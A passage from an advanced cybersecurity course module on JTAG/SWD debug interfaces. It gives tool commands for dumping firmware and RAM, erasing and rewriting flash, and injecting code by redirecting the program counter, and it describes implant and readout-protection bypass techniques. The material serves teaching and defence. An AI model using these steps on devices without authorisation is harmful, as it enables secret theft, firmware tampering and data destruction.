---
corso: "Cybersecurity Masterclass"
fase: "Domain 17 — Physical & Hardware Security"
modulo: "17.4"
titolo: "Debug Interfaces, Secure Boot Architectures, and Bypass"
versione: "IEEE 1149.1-2013, IEEE 1149.7-2009, ARM ADIv5.2, ARM ADIv6, OpenOCD 0.12, pyOCD 0.36"
livello: "Advanced"
prerequisiti:
  - "Domain 17.1 (physical security, side-channel overview)"
  - "Domain 17.2 (fault injection for secure-boot bypass — voltage/EM glitching)"
  - "Domain 17.3 (PCB RE for test-point identification, memory extraction)"
  - "ARM architecture fundamentals (Cortex-M/A, exception levels, TrustZone)"
  - "Firmware reverse engineering (Domain 12 — Ghidra, IDA, binary analysis)"
obiettivi:
  - "Navigate the IEEE 1149.1 TAP state machine and perform JTAG chain enumeration, boundary scan, and IDCODE identification on unknown targets"
  - "Exploit SWD debug interfaces using OpenOCD, pyOCD, and J-Link to dump firmware, extract RAM secrets, and manipulate peripheral registers on ARM Cortex-M targets"
  - "Enumerate ARM CoreSight debug architectures via ROM Table walking and assess debug authentication status (DBGEN/SPIDEN/NIDEN/SPNIDEN)"
  - "Analyze secure-boot chain-of-trust models (ARM TF-A, UEFI Secure Boot, Intel Boot Guard, NXP HABv4, Qualcomm, iOS SecureBoot) and identify bypass attack surfaces"
  - "Bypass debug lockout and secure boot on real targets using voltage glitching, mass-erase downgrade, and BootROM USB exploits (checkm8, FEL, BROM)"
tag: [jtag, swd, coresight, openocd, pyocd, secure-boot, uefi, boot-guard, checkm8, arm-trustzone, debug-bypass, tap-state-machine, boundary-scan]
---

# Domain 17, Chapter 17D — Debug Interfaces, Secure Boot Architectures, and Bypass

> **Learning Objectives.** After completing this module the student will be able to: (1) navigate the IEEE 1149.1 TAP 16-state machine, perform JTAG chain enumeration with IDCODE/BYPASS scans, execute boundary-scan pin mapping via BSDL files, and identify debug interfaces on unknown PCBs using JTAGulator; (2) exploit ARM SWD interfaces using OpenOCD, pyOCD, and J-Link Commander to halt CPUs, dump flash/SRAM, set hardware breakpoints, manipulate peripheral registers, and inject code via program-counter redirection; (3) enumerate ARM CoreSight debug components via ROM Table walking, assess debug authentication status (DBGEN/SPIDEN/NIDEN/SPNIDEN), and evaluate ETM trace, ITM output, and CTI cross-trigger as information leakage vectors; (4) analyze secure-boot chain-of-trust models across ARM TF-A (BL1-BL33), UEFI Secure Boot (PK/KEK/db/dbx), Intel Boot Guard, AMD PSB, NXP HABv4, Qualcomm PBL/SBL, and iOS SecureBoot, and identify per-architecture bypass attack surfaces; (5) bypass debug lockout and secure boot on real targets using voltage-glitch DBGEN bypass, STM32 RDP mass-erase downgrade, nRF52 APPROTECT glitch (CVE-2020-27211), ESP32 UART bootloader exploits, and checkm8 BootROM use-after-free.

> **Scope.** JTAG deep internals: IEEE 1149.1 TAP state machine (all 16 states, state transitions, TMS sequences, Test-Logic-Reset, Run-Test/Idle, Shift-DR, Shift-IR, Update-DR, Update-IR, Capture-DR, Capture-IR, Select-DR-Scan, Select-IR-Scan, Exit1/Exit2, Pause states), instruction register operations (BYPASS, IDCODE, EXTEST, SAMPLE/PRELOAD, INTEST, CLAMP, HIGHZ, custom vendor instructions), boundary scan (BSDL file format, pin toggling, automated test patterns, manufacturing test), JTAG daisy-chaining (multiple devices, IR length detection, BYPASS chaining, scan chain integrity), in-system programming via JTAG (flash programming through boundary scan, SVF/XSVF formats, STAPL), IEEE 1149.7 (compact JTAG / cJTAG — 2-wire protocol, star topology, advanced selection, command window), IEEE 1687 (IJTAG — internal JTAG for embedded instruments, SIB nodes, ICL/PDL). SWD deep internals: SWD vs JTAG comparison, SWD protocol (line reset, JTAG-to-SWD switch sequence 0x79E7), SWD packet format (start, APnDP, RnW, A[2:3], parity, stop, park, turnaround, ACK, WDATA/RDATA, data parity), Debug Port registers (DPIDR, CTRL/STAT, SELECT, RDBUFF, TARGETSEL), Access Port registers (MEM-AP CSW/TAR/DRW/BD0-BD3, APB-AP, AHB-AP, AXI-AP), multi-drop SWD (SWDv2 — TARGETSEL, DLCR, target identification, concurrent debug of multi-core SoCs), dormant state and wakeup sequences. ARM CoreSight debug architecture: DAP/DP/AP hierarchy, ROM Table structure and navigation (component class, peripheral ID, DEVTYPE, DEVARCH registers), CTI (Cross-Trigger Interface — channel/trigger mapping, event routing), ETM (Embedded Trace Macrocell — instruction trace, data trace, trace filtering, ViewInst, TraceID), ITM (Instrumentation Trace Macrocell — stimulus ports, printf debug, hardware event packets, sync packets), TPIU (Trace Port Interface Unit — SWO/trace port output, Manchester/UART encoding, trace formatter), MTB (Micro Trace Buffer — circular buffer trace for Cortex-M0+), debug authentication (DBGEN, NIDEN, SPIDEN, SPNIDEN signals, per-PE configuration, secure/non-secure, EL-gated debug). Debug interface discovery: JTAGulator (pin permutation algorithm, IDCODE scan, BYPASS scan, UART TX identification), Glasgow Interface Explorer, Bus Pirate, pin identification techniques (continuity, voltage probing, oscilloscope), test point analysis, OpenOCD auto-detection. Secure boot architectures: chain of trust model (BootROM → BL1 → BL2 → BL31/BL32/BL33), root of trust (hardware RoT, mask ROM, OTP key storage), ARM Trusted Firmware (TF-A boot stages), UEFI Secure Boot (PK/KEK/db/dbx key hierarchy, shim/MOK, Secure Boot variables), Intel Boot Guard (ACM/IBB/OBB, key fuses, verified vs measured boot), AMD Platform Secure Boot (PSP flow, signed firmware), Qualcomm Secure Boot (PBL/SBL/TZ, QFPROM, anti-rollback), NXP i.MX HABv4 (CSF, SRK fuse hash), measured boot (TPM PCR extension, event log, remote attestation), Android Verified Boot (dm-verity, vbmeta, rollback protection), iOS SecureBoot (BootROM → iBoot, SHSH, nonce entanglement, SEP). Secure boot bypass: BootROM vulnerabilities (checkm8 CVE-2019-8900, Allwinner FEL, MediaTek BROM, Tegra), bootloader vulnerabilities (U-Boot, GRUB BootHole CVE-2020-10713), UEFI bypass (dbx bypass, NVRAM manipulation, BlackLotus CVE-2022-21894), SPI flash modification, Boot Guard misconfiguration, downgrade attacks, DFU/recovery mode USB stack exploits, cold boot vs measured boot. Detection: boot event logging, remote attestation, debug lockout verification, firmware update integrity.
>
> **Audience.** Embedded security researchers analyzing debug interfaces, incident responders assessing device compromise vectors, architects designing secure boot chains, and red teamers performing hardware-assisted attacks.
>
> **Prerequisites.** Domain 17, Chapter 17A (side-channel analysis for boot timing identification). Domain 17, Chapter 17B (fault injection for secure boot bypass — voltage/EM glitching methodology). Domain 17, Chapter 17C (PCB RE for test point identification, memory extraction). Domain 12 (firmware reverse engineering). Domain 15 (mobile platform secure boot context). Domain 27 (TPM, measured boot, remote attestation).

---

## 1. JTAG deep internals

### 1.1 IEEE 1149.1 TAP state machine

The IEEE 1149.1 standard (commonly called JTAG, after the Joint Test Action Group that developed it) defines a Test Access Port (TAP) controlled by a 16-state finite state machine. The state machine is clocked by TCK (Test Clock) and transitions are controlled by TMS (Test Mode Select). The TAP also has TDI (Test Data Input) and TDO (Test Data Output) for serial data, and an optional TRST (Test Reset) for asynchronous reset.

The 16 states are organized into two parallel paths — the Data Register (DR) path and the Instruction Register (IR) path — each with its own Capture, Shift, Exit1, Pause, Exit2, and Update states. The top-level states (Test-Logic-Reset, Run-Test/Idle, Select-DR-Scan, Select-IR-Scan) control which path is active.

**Test-Logic-Reset.** The reset state. All test logic is disabled; the chip operates normally. The TAP enters this state on power-up (via TRST assertion or by holding TMS high for 5 or more TCK cycles — the "guaranteed reset" sequence). After reset, the IDCODE instruction is loaded into the IR (if the device has IDCODE) or BYPASS is loaded.

**Run-Test/Idle.** The quiescent state between operations. The TAP waits here until the controller initiates a new scan operation. Some JTAG devices use this state to execute internal self-test operations (triggered by loading the RUNBIST instruction and entering Run-Test/Idle).

**Select-DR-Scan / Select-IR-Scan.** Decision states that route the TAP into either the Data Register path or the Instruction Register path, depending on TMS.

**Capture-DR / Capture-IR.** The currently selected data register (DR) or instruction register (IR) captures its parallel input. For DR: the content depends on the current instruction — IDCODE loads the device's 32-bit identification code, BYPASS loads a single 0 bit, EXTEST loads the current pin values, and SAMPLE/PRELOAD loads the boundary-scan register with the current pin states. For IR: the IR captures a fixed value (typically with the least-significant two bits set to "01" as a diagnostic marker).

**Shift-DR / Shift-IR.** The register shifts data serially: TDI enters the MSB end, TDO exits the LSB end, on each TCK rising edge. The controller shifts data through the register to load new values (for IR: a new instruction; for DR: new test data) or to read the register's current contents.

**Exit1-DR / Exit1-IR, Pause-DR / Pause-IR, Exit2-DR / Exit2-IR.** These states manage multi-cycle shifts: the TAP can pause a shift operation (entering Pause), then resume (via Exit2 back to Shift), or complete (via Exit1 to Update). The Pause states allow the controller to suspend a long shift operation (e.g., while waiting for external data).

**Update-DR / Update-IR.** The latching states: the shifted data is transferred from the shift register to the parallel output latch. For IR: the new instruction takes effect. For DR: the new data is applied (e.g., EXTEST drives the new values onto the chip's pins). Update-DR/IR transition is the point where the operation actually takes effect on the chip.

The state machine is navigated by TMS sequences. Common sequences (starting from Test-Logic-Reset): to read IDCODE — move to Shift-DR (TMS: 0,1,0,0), shift out 32 bits (TMS held low for 32 TCK cycles), then return to Run-Test/Idle (TMS: 1,1,0). To load an instruction — move to Shift-IR (TMS: 0,1,1,0,0), shift in the instruction bits, then return via Update-IR and Run-Test/Idle.

### 1.2 JTAG instructions

**BYPASS (all-ones IR value).** Selects a single-bit data register that passes TDI to TDO with one clock cycle delay. BYPASS allows the controller to communicate with downstream devices in a daisy chain while minimizing the shift length through this device. Every JTAG-compliant device must support BYPASS.

**IDCODE (vendor-defined, typically 0x01 or 0x0E).** Selects the 32-bit Device Identification register. The IDCODE format: bits [31:28] = version, bits [27:12] = part number, bits [11:1] = manufacturer ID (from JEDEC JEP106), bit [0] = always 1 (a marker that distinguishes IDCODE from BYPASS in chain detection). The IDCODE is the primary identifier for unknown devices — the manufacturer ID maps to a company, and the part number maps to a specific IC.

**EXTEST.** Drives the boundary-scan register's values onto the chip's output pins and captures the current values of input pins. Used for board-level interconnect testing: the controller drives known values on one chip's outputs and reads them back on another chip's inputs, verifying the PCB trace connectivity between them.

**SAMPLE/PRELOAD.** Captures the current pin states into the boundary-scan register (SAMPLE) without affecting the chip's normal operation. PRELOAD loads values into the boundary-scan register's output latches, preparing for a subsequent EXTEST that will drive those values onto the pins.

**INTEST.** The complement of EXTEST: drives boundary-scan register values to the chip's internal logic and captures the internal logic's responses. INTEST is used for testing the chip's internal logic while controlling the pin values. In security context, INTEST can be used to inject specific values into the chip's internal buses — potentially bypassing security checks by forcing control signals to desired states.

**Custom/vendor instructions.** Most chips define additional JTAG instructions beyond the IEEE 1149.1 mandatory set. ARM processors define debug instructions that access the CoreSight debug interface through JTAG: DPACC (Debug Port Access — read/write Debug Port registers), APACC (Access Port Access — read/write Access Port registers), and ABORT (abort a pending operation). These custom instructions provide the bridge between the JTAG TAP and the processor's debug subsystem.

### 1.3 Boundary scan and BSDL

The Boundary Scan Description Language (BSDL) is a standardized text file (defined in IEEE 1149.1 supplement) that describes a chip's JTAG implementation: the IR length, supported instructions, boundary-scan register cell definitions (which cell connects to which pin, the cell type — input/output/bidirectional/internal), and IDCODE value. BSDL files are provided by IC manufacturers (available on their websites or through EDA tool libraries) and are consumed by JTAG test software (XJTAG, JTAG Technologies ProVision, Goepel SCANFLEX) to automatically generate test patterns for board-level testing.

In security context, BSDL files are useful for the reverse engineer because they document the complete boundary-scan register structure, revealing which pins are controllable and observable through JTAG. The analyst can use BSDL data to: toggle specific output pins (e.g., driving a reset line to force a reboot, driving a GPIO to trigger a specific boot mode), observe input pin states (monitoring data bus signals, reading status pins), and infer the chip's pin functions (BSDL cell names often reveal pin function: "PA0_SPI_MOSI", "PB3_JTAG_TDO", "BOOT0").

### 1.4 JTAG daisy-chaining

Multiple JTAG devices can share a single TAP interface by daisy-chaining: TDO of one device connects to TDI of the next. All devices share TMS and TCK. The controller communicates with a specific device by loading the target device's instruction while loading BYPASS into all other devices. Data shifted through the chain passes through each device's selected register (either the target register on the addressed device or the 1-bit BYPASS register on all others).

Chain detection involves determining the number of devices and their IR lengths. The algorithm: (1) reset the chain (hold TMS high for 5+ cycles), which loads IDCODE or BYPASS into each device's IR. (2) Enter Shift-DR and shift out a long bit string — each device with IDCODE contributes a 32-bit IDCODE (bit 0 = 1), and each device with BYPASS contributes a 0 bit. The controller counts IDCODEs (32-bit values with bit 0 = 1) to determine the chain length and identify each device. (3) The IR lengths are determined by entering Shift-IR and counting the number of bits between the captured "01" markers from each device's Capture-IR.

### 1.5 IEEE 1149.7 (cJTAG) and IEEE 1687 (IJTAG)

**IEEE 1149.7 (compact JTAG / cJTAG).** Reduces the JTAG interface from 4/5 wires to 2 wires (TMSC and TCKC), enabling debug access on pin-constrained devices. cJTAG supports a star topology (individual 2-wire connections to each device, instead of a daisy chain), advanced device selection (addressing individual devices without BYPASS chaining), and backward compatibility (the 2-wire interface can emulate the full 4-wire protocol). cJTAG is increasingly common on modern ARM Cortex-M devices (especially those with small packages — QFN-16, WLP).

The cJTAG protocol operates in two modes. In the standard mode, the 2-wire interface emulates the 4-wire protocol by multiplexing TMS and TDI/TDO signals over the TMSC line using a time-division scheme — the controller drives TMS during the first half of each clock cycle and shifts data during the second half. In the advanced mode, the controller sends command windows: short bit sequences on TMSC that select a specific target device (by address), configure scan parameters, and initiate operations. The command window mechanism replaces the BYPASS-based addressing of traditional daisy chains, reducing the scan overhead from O(n) bits per device in the chain to O(1) per addressed device. cJTAG's advanced mode also supports background data transfer (BDX), which allows the debug probe to stream data to/from the target without occupying the scan chain, enabling simultaneous debug and test operations.

**IEEE 1687 (IJTAG).** Extends JTAG into the chip's internal structure, providing standardized access to embedded instruments (on-chip temperature sensors, voltage monitors, PLL controls, self-test engines, embedded memory BIST controllers, DFT scan chains). IJTAG uses Segment Insertion Bits (SIBs) to create a hierarchical scan network: each SIB acts as a gate that, when opened, inserts a sub-network into the scan chain. The SIB has two states — open (the instrument's scan segment is included in the chain) and closed (the instrument is bypassed with a single-bit path). This hierarchy allows selective access to individual instruments without scanning through the entire internal network.

The Instrument Connectivity Language (ICL) describes the network topology in a machine-readable format: which SIBs exist, how they are connected, what instruments are behind each SIB, and the scan chain lengths at each level. The Procedural Description Language (PDL) defines test sequences — step-by-step operations that open specific SIBs, write values to instrument registers, and read back results. Together, ICL and PDL allow EDA tools (Siemens/Mentor Tessent, Synopsys) to automatically generate access sequences for any instrument in the hierarchy. From a security perspective, IJTAG access to on-chip instruments can provide the attacker with capabilities beyond traditional JTAG: reading on-chip temperature and voltage (useful for calibrating fault-injection parameters, Chapter 17B), accessing embedded PLLs (for clock manipulation), interacting with on-chip security monitors (potentially disabling them), and manipulating embedded memory BIST to read out memory contents that would not be accessible through normal memory-mapped interfaces.

### 1.6 JTAG security implications and attack techniques

JTAG was designed for manufacturing test and debug, not for use in adversarial environments. The consequences of an unlocked JTAG interface on a production device are severe and multifaceted.

**Full memory access.** Through boundary scan (EXTEST/INTEST) or the debug access port (DPACC/APACC on ARM devices), the attacker gains read/write access to the chip's entire address space — including RAM (extracting cryptographic keys, credentials, and runtime state), flash (reading firmware for offline reverse engineering), and peripheral registers (reconfiguring security-critical hardware such as the MPU, SAU, or firewall controllers). This access bypasses all software protections: access control lists, memory protection units, TrustZone isolation, and even secure enclaves — because JTAG operates at the hardware level, below all software-mediated access control.

**Code execution.** The attacker can modify the processor's program counter (PC) and general-purpose registers via the debug interface, then resume execution. This allows arbitrary code injection: the attacker writes a shellcode payload to RAM via the debug port, sets PC to the payload address, and resumes the processor. The payload executes with the processor's current privilege level — typically the highest level, since most debug connections halt the processor in a privileged state. On ARM Cortex-M devices, the debug halt always occurs in Thread or Handler mode with full privilege, giving the injected code unrestricted access.

**Persistent implant installation.** With write access to the flash memory via JTAG, the attacker can modify the device's firmware in-situ: patching out security checks (overwriting conditional branch instructions with NOPs), inserting backdoors (adding a function that opens a network listener or exfiltrates data), or replacing the entire firmware image with a trojaned version. Because the modification is made directly to the flash, it persists across reboots and power cycles. The modified firmware's hash will differ from the original, but if the device lacks secure boot (or if the attacker also modifies the hash/signature verification logic), the tampering is undetectable by the device itself.

**Bypass of readout protection.** Many microcontrollers implement readout protection (RDP on STM32, Code Read Protection on LPC, APPROTECT on nRF52) that prevents JTAG from reading flash memory. However, these protections have been bypassed on numerous platforms: STM32F0/F1/F3 RDP Level 1 can be bypassed by cold-boot glitching the RDP check (Chapter 17B §8.2), nRF52 APPROTECT can be bypassed by voltage glitching the fuse-read circuit (Chapter 17B §8.4), and some Microchip PIC devices allow code extraction through careful use of the ICSP (In-Circuit Serial Programming) protocol's row-erase feature — the attacker erases specific flash pages while leaving the rest intact, then uses the debug interface to read the non-erased pages one at a time (repeating with different erase patterns to reconstruct the entire firmware).

### 1.7 JTAG/SWD exploitation tool commands

Practical exploitation of debug interfaces requires fluency with the tool chains that translate high-level intent (dump firmware, inspect registers, program flash) into wire-level JTAG/SWD transactions. This section provides the exact command sequences for the dominant tool ecosystems.

**OpenOCD target detection and identification.** OpenOCD is the de facto open-source debug tool. A session begins by specifying the debug adapter and the target. The adapter configuration file selects the physical probe hardware, and the target configuration file describes the SoC's debug architecture (TAP configuration, flash driver, work area). A typical detection sequence for an STM32F4 connected via an ST-Link v2 adapter proceeds as follows.

```bash
# Launch OpenOCD with ST-Link adapter and STM32F4 target
openocd -f interface/stlink.cfg -f target/stm32f4x.cfg

# For FTDI-based adapters (Bus Blaster, Olimex ARM-USB-OCD-H):
openocd -f interface/ftdi/olimex-arm-usb-ocd-h.cfg -f target/stm32f4x.cfg

# For J-Link as an OpenOCD adapter:
openocd -f interface/jlink.cfg -f target/stm32f4x.cfg

# Auto-detect an unknown target — use the generic SWD transport
# and manually probe the DPIDR:
openocd -f interface/stlink.cfg -c "transport select swd" \
        -c "adapter speed 1000" -c "swd newdap chip cpu" \
        -c "target create chip.cpu cortex_m -chain-position chip.cpu" \
        -c "init" -c "dap info"
```

Once OpenOCD is running, a telnet or GDB connection on port 4444 (telnet) or 3333 (GDB) provides interactive access. The `dap info` command enumerates the ROM Table, revealing all CoreSight components and their base addresses. For an unknown ARM SoC, this enumeration is the first step in mapping the debug architecture.

**Memory read/write via OpenOCD.** The memory display and memory write commands operate on the MEM-AP and provide direct access to the target's address space.

```bash
# Read 16 words (32-bit each) starting at address 0x08000000 (STM32 flash base)
mdw 0x08000000 16

# Read single byte at address
mdb 0x20000000

# Write a 32-bit word: write 0xDEADBEEF to address 0x20001000 (SRAM)
mww 0x20001000 0xDEADBEEF

# Write a single byte
mwb 0x20002000 0x41

# Dump a memory region to a binary file on the host
dump_image firmware.bin 0x08000000 0x100000

# Dump only a specific SRAM region (64 KB from 0x20000000)
dump_image sram_dump.bin 0x20000000 0x10000
```

**Flash programming and firmware extraction.** OpenOCD includes flash drivers for hundreds of microcontroller families. The flash commands handle sector erase, programming, and verification. Extracting the full flash image is often the first objective in a hardware assessment.

```bash
# Read flash into a file (entire 1 MB flash on STM32F4)
flash read_image firmware_dump.bin 0x08000000 0x100000 bin

# Erase the entire flash (destructive — confirm scope authorization)
flash erase_address 0x08000000 0x100000

# Program a modified firmware image back to the target
flash write_image erase firmware_modified.bin 0x08000000 bin

# Verify the programmed image matches the file
flash verify_image firmware_modified.bin 0x08000000 bin
```

**CPU halt, single-step, and register inspection.** These commands are the foundation of dynamic analysis via the debug port. Halting the CPU freezes execution, allowing inspection and modification of the full register file and memory state.

```bash
# Halt the processor
halt

# Display all general-purpose registers
reg

# Read a specific register (e.g., the program counter)
reg pc

# Set the program counter to a specific address (code injection pivot)
reg pc 0x20001000

# Single-step one instruction
step

# Resume execution
resume

# Set a hardware breakpoint at an address
bp 0x08001234 2 hw

# Remove a breakpoint
rbp 0x08001234
```

**Boundary scan for pin mapping.** OpenOCD's boundary scan support (via SVF player or direct TAP manipulation) allows toggling output pins and reading input pins. This is valuable for mapping unknown test points on a PCB when the BSDL file identifies pin functions.

```bash
# Play an SVF file that exercises boundary scan
openocd -f interface/ftdi/olimex-arm-usb-ocd-h.cfg \
        -c "adapter speed 1000" \
        -c "jtag newtap chip tap -irlen 4 -expected-id 0x4BA00477" \
        -c "init" -c "svf boundary_test.svf" -c "shutdown"
```

**pyOCD commands for ARM Cortex-M.** pyOCD is a Python-based tool specifically designed for ARM Cortex-M debug. It provides a higher-level interface than OpenOCD and integrates well with scripted workflows.

```bash
# List connected probes
pyocd list

# Open an interactive commander session
pyocd commander -t nrf52840

# Inside the commander session:
# Read 32-bit word at address
read32 0x10001208    # nRF52 UICR APPROTECT register

# Read a block of memory and save to file
savemem 0x00000000 0x80000 firmware_nrf52.bin

# Write a word to memory
write32 0x20000000 0xCAFEBABE

# Flash a binary image
pyocd flash -t stm32f407vg firmware.bin

# Erase the entire flash
pyocd erase -t stm32f407vg --chip

# Reset the target
pyocd reset -t nrf52840
```

**J-Link Commander.** Segger's J-Link Commander provides a proprietary but widely used interface. Many vendor-specific SoC debug features (particularly on Nordic, NXP, and Renesas parts) are only fully supported through J-Link.

```bash
# Launch J-Link Commander
JLinkExe

# Inside the J-Link Commander session:
connect
# Select device: STM32F407VG
# Select interface: SWD
# Select speed: 4000 kHz

# Read memory (hex dump)
mem 0x08000000 0x100

# Write a 32-bit value
w4 0x20001000 0xDEADBEEF

# Save memory region to file
savebin firmware.bin 0x08000000 0x100000

# Load a binary to flash
loadbin firmware_modified.bin 0x08000000

# Halt and inspect registers
halt
regs

# Reset the target
r
```

**Glasgow Interface Explorer.** Glasgow is an open-source FPGA-based tool that implements JTAG and SWD via software-defined applets. Its strength is flexibility — the FPGA fabric can be reprogrammed for arbitrary protocols, and the Python API allows scripted interaction.

```bash
# Run the JTAG probe applet to scan for devices
glasgow run jtag-probe -V 3.3 --pins-tck 0 --pins-tms 1 \
        --pins-tdi 2 --pins-tdo 3

# Run the SWD probe applet
glasgow run swd-probe -V 3.3 --pins-swclk 0 --pins-swdio 1

# Run the JTAG SVF player to execute boundary scan sequences
glasgow run jtag-svf -V 3.3 --pins-tck 0 --pins-tms 1 \
        --pins-tdi 2 --pins-tdo 3 boundary_test.svf
```

---

## 2. SWD deep internals

### 2.1 SWD vs JTAG comparison

Serial Wire Debug (SWD) is an ARM-specific debug protocol that provides the same debug functionality as JTAG using only 2 pins: SWDIO (bidirectional data) and SWCLK (clock). SWD was introduced with ARM's CoreSight debug architecture and is the default debug interface on ARM Cortex-M processors. SWD advantages over JTAG: fewer pins (2 vs 4-5), no daisy-chain requirement (each device has its own SWD connection, or uses multi-drop with addressing), higher data throughput for debug operations (SWD packet protocol is more efficient than JTAG shift registers for random-access memory reads/writes), and built-in error detection (parity on every transaction).

SWD disadvantages: ARM-specific (not usable on non-ARM architectures), no boundary scan capability (SWD accesses only the debug/memory subsystem, not the chip's pin boundary), and requires a debug probe that supports SWD (CMSIS-DAP, ST-Link, J-Link, or similar).

### 2.2 SWD protocol

**Line reset.** 50+ clock cycles with SWDIO held high, followed by at least 2 idle (low) cycles. This resets the SWD interface to a known state.

**JTAG-to-SWD switch.** Many ARM processors share the JTAG and SWD pins (TMS/SWDIO and TCK/SWCLK). The interface defaults to JTAG mode. To switch to SWD, the debug probe sends a 16-bit sequence (0x79E7, bit-reversed) on SWDIO while clocking SWCLK. This sequence is recognized by the SWD interface logic, which switches the pin mux from JTAG to SWD mode. The switch sequence is followed by a line reset and an IDCODE read to confirm the transition.

**SWD packet format.** Each SWD transaction consists of a request phase (host → target) and a response phase (target → host):

Request (8 bits): Start (1, always 1) + APnDP (1 bit: 0=Debug Port, 1=Access Port) + RnW (1 bit: 0=Write, 1=Read) + A[2:3] (2 bits: register address within the selected port) + Parity (1 bit: even parity over APnDP+RnW+A[2:3]) + Stop (1 bit: always 0) + Park (1 bit: always 1).

Turnaround: SWDIO changes direction (host releases, target drives). Duration is 1 clock cycle (configurable in DLCR register).

Response ACK (3 bits): OK (0b001), WAIT (0b010), or FAULT (0b100). On OK, the data phase follows. On WAIT, the host retries. On FAULT, the host reads the CTRL/STAT register for error information.

Data phase (33 bits): 32 data bits + 1 parity bit. For reads, the target drives RDATA; for writes, the host drives WDATA (after another turnaround).

### 2.3 Debug Port and Access Port registers

**Debug Port (DP) registers** control the debug interface itself:

- **DPIDR (DP Identification Register, address 0x00, read-only).** Contains the DP version, designer code, and identification. Reading DPIDR is the first SWD operation — it confirms connectivity and identifies the DP implementation.
- **CTRL/STAT (address 0x04).** Control and status: CSYSPWRUPREQ/CSYSPWRUPACK (system power request/acknowledge), CDBGPWRUPREQ/CDBGPWRUPACK (debug power request/acknowledge), STICKYERR/STICKYCMP/STICKYORUN (error flags), ORUNDETECT (overrun detection enable). The debug probe must set CSYSPWRUPREQ and CDBGPWRUPREQ and wait for the acknowledge bits before proceeding.
- **SELECT (address 0x08).** Selects the Access Port (APSEL field, bits [31:24]) and the register bank within the AP (APBANKSEL, bits [7:4]). Multiple APs can exist on a single DAP (Debug Access Port); SELECT chooses which AP receives APACC transactions.
- **RDBUFF (address 0x0C, read-only).** Read buffer — returns the result of the last AP read. AP reads are posted (the result is available on the *next* read); RDBUFF provides a way to retrieve the result without initiating another AP read.

**Access Port (AP) registers** provide access to the chip's memory and peripherals:

- **MEM-AP (Memory Access Port).** The most common AP type. Provides read/write access to the chip's memory map through three primary registers: CSW (Control/Status Word — configures access size, auto-increment, and mode), TAR (Transfer Address Register — the target address), and DRW (Data Read/Write — the data register). To read a memory address: write the address to TAR, then read DRW — the result appears in the next read (posted). To write: write the address to TAR, write the data to DRW. The auto-increment feature (configured in CSW) advances TAR after each DRW access, enabling efficient block transfers.
- **APB-AP.** Provides access to the CoreSight debug components through an APB (Advanced Peripheral Bus) interface. Used for accessing debug registers (breakpoints, watchpoints, trace configuration) that are memory-mapped on the debug APB.

### 2.4 Multi-drop SWD (SWDv2)

SWDv2, introduced in ARM ADIv5.2 (ARM Debug Interface Architecture v5.2), enables multiple targets on a single SWD connection (multi-drop). This is essential for modern SoCs with multiple processor cores, each with its own debug port, sharing a single pair of SWD pins.

**TARGETSEL command.** The host selects a specific target by issuing a TARGETSEL write (a special SWD write packet with APnDP=0, A[2:3]=0b11) containing the target's TARGETID value. Only the addressed target responds to subsequent SWD transactions; all other targets ignore them.

**Dormant state.** Non-selected targets enter a dormant state where they ignore all SWD traffic until they see a wakeup sequence addressed to them. The dormant-to-SWD transition uses a specific bit sequence (0x49CF9046 followed by the target's TINSTANCE value) that is unlikely to occur in normal SWD traffic.

Multi-drop SWD is transparent to the debug software: the probe (J-Link, ST-Link, CMSIS-DAP) handles target selection automatically. From a security perspective, multi-drop SWD means that connecting to the SWD pins of a multi-core SoC may provide access to all cores, including the secure processor (if its debug port shares the same physical pins and is not independently locked).

### 2.5 SWD attack techniques and forensic considerations

**SWD as the primary embedded attack vector.** On modern ARM-based IoT devices, SWD has largely replaced JTAG as the debug interface because of its lower pin count. Consequently, SWD is also the primary physical attack vector. The typical attack flow: identify SWD pins on the PCB (§4), connect a debug probe, power-up the device, read DPIDR to confirm connectivity, power up the debug domain (set CSYSPWRUPREQ and CDBGPWRUPREQ in CTRL/STAT), connect to the MEM-AP, and begin memory access. The entire sequence — from physical probe connection to full memory dump — takes seconds once the pin assignment is known.

**Flash dump via SWD.** To dump the device's firmware through SWD: configure the MEM-AP's CSW for 32-bit word accesses with auto-increment enabled, write the flash base address to TAR (0x08000000 on STM32, 0x00000000 on nRF52, 0x10000000 on RP2040), and repeatedly read DRW — each read returns the next 32-bit word and advances TAR by 4. At typical SWD clock rates (1–10 MHz), a 1 MB flash image takes seconds. Tools: pyOCD (`pyocd commander` with `read32` or `savemem`), OpenOCD (`mdw` or `dump_image`), probe-rs (Rust-based, `cargo flash --chip <target>`), and vendor tools (STM32CubeProgrammer, nRFJProg).

**RAM scraping for secrets.** Many embedded devices store cryptographic keys, session tokens, Wi-Fi credentials, and other secrets in RAM during operation. SWD provides real-time access to RAM without halting the processor (using the MEM-AP in non-halting access mode — some implementations support this, though most require halting). The attacker halts the processor, dumps the RAM region (typically 64 KB to 512 KB on Cortex-M devices), and searches for known patterns: AES key schedules (identifiable by their structure — 11 round keys for AES-128), RSA private key components (identifiable by their size and structure — look for consecutive large primes), and plaintext credentials (ASCII strings in known formats).

**Peripheral register manipulation.** Beyond memory, SWD provides access to all memory-mapped peripherals. The attacker can: disable the watchdog timer (preventing automatic reboot during analysis), reconfigure the MPU (Memory Protection Unit) to remove access restrictions, disable interrupt handlers (preventing security-monitor interrupts from firing), reconfigure GPIO to control external components (enabling a debug LED, asserting a reset line on a connected secure element), and read out peripheral state (reading the RNG output register, the AES accelerator's key registers, or the TRNG health status). On some SoCs, the cryptographic accelerator's key registers are readable via SWD even when the firmware has configured them as write-only — the write-only restriction is enforced by the bus fabric's access control, which may not apply to debug-port accesses.

**Anti-forensic detection.** An analyst investigating a device that may have been tampered with via SWD should check: the debug authentication status (DBGAUTHSTATUS — if debug was supposed to be locked but is unlocked, the device may have been glitched), the DHCSR (Debug Halting Control and Status Register) S_HALT and C_DEBUGEN bits (which indicate that the processor has been halted by a debugger), the DWT (Data Watchpoint and Trace) CYCCNT register (a free-running cycle counter that resets on debug-halt — an unexpectedly low value on a device that has been running for hours suggests a recent debug halt), and the DEMCR (Debug Exception and Monitor Control Register) VC_CORERESET bit (which, if set, indicates that a debugger configured the processor to halt on reset — a strong indicator of debug access).

---

## 3. ARM CoreSight debug architecture

### 3.1 Architecture overview

CoreSight is ARM's debug and trace infrastructure standard. A CoreSight system consists of:

**DAP (Debug Access Port).** The top-level interface that connects the external debug probe (via JTAG or SWD) to the chip's internal debug fabric. The DAP contains one DP (connected to the external interface) and one or more APs (connected to different internal buses).

